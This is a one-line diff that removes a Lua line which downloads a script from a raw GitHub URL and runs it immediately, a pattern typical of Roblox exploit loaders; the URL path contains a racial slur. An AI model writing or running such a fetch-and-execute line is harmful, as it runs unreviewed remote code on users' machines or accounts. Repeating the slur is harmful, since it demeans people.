@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sinnedgui/niggaz/refs/heads/main/%40sinnedgui.lua"))()
